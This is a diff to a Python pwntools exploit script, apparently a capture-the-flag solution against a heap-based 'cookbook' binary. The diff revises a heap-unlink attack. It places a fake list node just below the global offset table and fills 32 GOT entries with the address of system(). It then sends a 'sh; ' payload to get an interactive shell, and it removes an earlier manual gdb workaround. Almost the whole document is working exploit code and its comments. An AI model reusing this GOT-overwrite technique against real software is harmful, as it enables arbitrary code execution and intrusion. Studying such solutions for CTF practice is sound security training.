@@ -110,18 +110,28 @@ if __name__ == "__main__":
     #
     # [5] make the fake second node
     #
+    # CURRENT_INGREDIENT will be 0x804cff8 after unlinking 
+    # 0x804cff8->next == 0
+    # 0x804cff8 + 8 == 0x804d000
+    # GOT start 0x804d00c
+    # 
+    # memcpy((char *)CURRENT_INGREDIENT + 8, "sh; \x00\x00\x00\x00" + p32(SYSTEM_ADDR)*32")
+    #
     raw_input('[5] go?')
     s('a')
     s('n') # calloc()
     s('s')
     s(str(0))
     s('p')
-    s(str(b.got['strtoul']))
+    s(str(0x804cff8))
     s('q')
     r.recv()
 
     #
     # [6] overwrite the first node to 0x804d098
+    #
+    # 0x804d098->next == 0x804d09c == CURRENT_INGREDIENT
+    # so, CURRENT_INGREDIENT will point 0x804cff8 after unlinking
     #
     raw_input('[6] go?')
     s('c')
@@ -135,15 +145,6 @@ if __name__ == "__main__":
     #
     # [7] free the second node
     # 
-
-    # UNLINK approach failed! couldn't meet the constraint.
-    #
-    # list_length() tries to traverse the list and it explodes!
-    
-    print "gdb -p `pidof cookbook` ./cookbook"
-    print "pwndbg> set {int}0x804d03c = 0"
-    print "pwndbg> quit"
-    
     raw_input('[7] go?')
     
     s('c')
@@ -152,20 +153,11 @@ if __name__ == "__main__":
     s('q')
 
     #
-    # [8] overwrite strtoul@got
+    # [8] overwrite 32 got entries
     #
     raw_input('[8] go?')
     s('a')
-    s('s')
-    s(str(SYSTEM_ADDR))
-    s('q')
-    r.recv()
-
-    #
-    # [9] trigger
-    #
-    raw_input('[9] go?')
     s('g')
-    s('/bin/sh')
-
+    s('sh; ' + p32(0) + p32(SYSTEM_ADDR) * 32)
     r.interactive()
+
